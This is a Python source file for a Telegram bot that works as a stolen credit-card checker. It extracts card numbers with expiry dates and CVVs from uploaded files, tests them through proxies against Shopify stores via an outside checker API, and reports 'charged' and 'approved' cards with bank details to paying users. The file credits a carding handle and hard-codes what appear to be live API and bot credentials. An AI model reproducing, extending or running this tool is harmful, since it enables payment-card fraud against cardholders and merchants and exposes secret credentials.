from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

API_ID = 37235723
API_HASH = '880a876edaf529c8493b873d47821ec2'
BOT_TOKEN = '8794282630:AAEG9s36HYsNan73p8pbObfmOtDqWSLIo9Y'
ADMIN_ID = [7077294261]
CHECKER_API_URL = 'https://afuonax1.up.railway.app/shopify_parallel'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}
semaphore = asyncio.Semaphore(25)

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
}

def premium_emoji(text: str) -> str:
    if not text: return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cmd", b"show_cmds", style="success"),
         Button.url(" Channel", "https://t.me/ccscrapharshOp", style="success")]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Admin Panel", b"admin_panel", style="success")])
    return buttons

def get_file_lines(filepath):
    if not os.path.exists(filepath): return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except: return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for admin in ADMIN_ID: f.write(f"{admin}\n")
        return [str(admin) for admin in ADMIN_ID]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        for admin in ADMIN_ID:
            if str(admin) not in users:
                users.append(str(admin))
                with open(PREMIUM_USERS_FILE, 'w') as f:
                    for u in users: f.write(f"{u}\n")
        return users
    except: return [str(admin) for admin in ADMIN_ID]

def load_sites(): return get_file_lines(SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)
def is_premium(user_id): return str(user_id) in load_premium_users()

async def add_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users: await f.write(f"{uid}\n")
        return True
    return False

async def remove_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) in premium_users:
        premium_users.remove(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users: await f.write(f"{uid}\n")
        return True
    return False

def is_site_dead(response_msg, gateway, price):
    if not response_msg or not gateway or gateway == "Unknown": return True
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]: return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(10)) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200: return 'BIN Info Not Found', '-', '-', '-', '-', ''
                data = await res.json()
                return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for card, month, year, cvv in matches:
        if len(year) == 2: year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        if not site.startswith('http'): site = f'https://{site}'
        
        proxy_str = None
        if proxy:
            p = proxy.split(':')
            if len(p) == 4: proxy_str = f"{p[0]}:{p[1]}:{p[2]}:{p[3]}"
            elif len(p) == 2: proxy_str = f"{p[0]}:{p[1]}"
            else: proxy_str = proxy

        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str: url += f'&proxy={proxy_str}'

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(100)) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                raw = await resp.json()

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price != '-' and price != 0: price = f"${price}"
        gateway = raw.get('Gateway', 'Shopify')

        if is_site_dead(response_msg, gateway, price):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        lower = response_msg.lower()
        if any(x in lower for x in ['charged', 'order_placed', 'success', 'thank you', 'payment successful', 'approved', 'insufficient_funds']):
            status = 'Charged' if 'charged' in lower or 'success' in lower else 'Approved'
            return {'status': status, 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    for _ in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        if not result.get('retry'): return result
        await asyncio.sleep(0.3)
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type, username):
    status_text = "CHARGED" if hit_type == "Charged" else "APPROVED"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gateway {result.get('gateway', 'Unknown')}
📝 Response {result['message'][:150]}
💸 Price {result.get('price', '-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}"""
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except: pass

async def update_progress(user_id, message_id, results, current):
    progress_text = f""" 💳 Card: <code>{results.get('last_card', 'None')}</code>
💰 {results.get('last_price', '-')}
📝 {results.get('last_response', 'Waiting...')[:30]}"""
    buttons = [
        [Button.inline(f" CHARGED {len(results['charged'])}", b"none", style="success")],
        [Button.inline(f" APPROVED {len(results['approved'])}", b"none", style="primary")],
        [Button.inline(f" DECLINED {len(results['dead'])}", b"none", style="danger")],
        [Button.inline(" STOP", f"stop_{user_id}".encode(), style="danger")]
    ]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except: pass

async def send_final_results(user_id, results):
    hits_text = ""
    for r in results['charged'][:5]: hits_text += f"<code>{r['card']}</code>\n"
    for r in results['approved'][:5]: hits_text += f"<code>{r['card']}</code>\n"
    if not hits_text: hits_text = "No hits found"

    summary = f"""✅ Check Complete!

📊 Charged: {len(results['charged'])}
🔥 Approved: {len(results['approved'])}
❌ Declined: {len(results['dead'])}
📊 Total: {results['total']}

Hits:
{hits_text}

💡 Made by @CARDINGxHARSH"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"hits_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']: await f.write(f"{r['card']} | {r.get('gateway')} | {r.get('price')} | {r['message'][:100]}\n")
        await f.write("\nAPPROVED:\n")
        for r in results['approved']: await f.write(f"{r['card']} | {r.get('gateway')} | {r.get('price')} | {r['message'][:100]}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try: os.remove(filename)
    except: pass

# ===================== FAST /chk =====================
@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to .txt file"), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Only .txt file"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🚀 Starting Fast Check..."), parse_mode='html')

    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    os.remove(file_path)

    if not cards:
        await status_msg.edit(premium_emoji("❌ No cards found"), parse_mode='html')
        return

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔥 Checking {total_cards} cards..."), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards, 'checked': 0, 'start_time': time.time(), 'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Unknown'}

    try:
        queue = asyncio.Queue()
        for card in cards: queue.put_nowait(card)

        last_update = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                if active_sessions[session_key].get('paused'): 
                    await asyncio.sleep(1); continue
                try: card = queue.get_nowait()
                except asyncio.QueueEmpty: break

                async with semaphore:
                    res = await check_card_with_retry(card, load_sites(), load_proxies(), max_retries=1)
                    all_results['checked'] += 1
                    all_results['last_card'] = card
                    all_results['last_response'] = res.get('message', '')[:50]
                    all_results['last_price'] = res.get('price', '-')

                    if res['status'] == 'Charged':
                        all_results['charged'].append(res)
                        await send_realtime_hit(user_id, res, 'Charged', '')
                    elif res['status'] == 'Approved':
                        all_results['approved'].append(res)
                        await send_realtime_hit(user_id, res, 'Approved', '')
                    else:
                        all_results['dead'].append(res)

                    if time.time() - last_update[0] >= 4:
                        last_update[0] = time.time()
                        try: await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except: pass
                queue.task_done()

        workers = [asyncio.create_task(worker()) for _ in range(18)]
        await asyncio.gather(*workers, return_exceptions=True)

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions: del active_sessions[session_key]
        try: await status_msg.delete()
        except: pass
        await send_final_results(user_id, all_results)

# ===================== BAaki COMMANDS (Original) =====================
# Yahan tera pura purana code paste kar sakta hai (/start, /cc, /proxy etc.)

print("✅ Bot started successfully with FAST MODE!")
bot.run_until_disconnected()
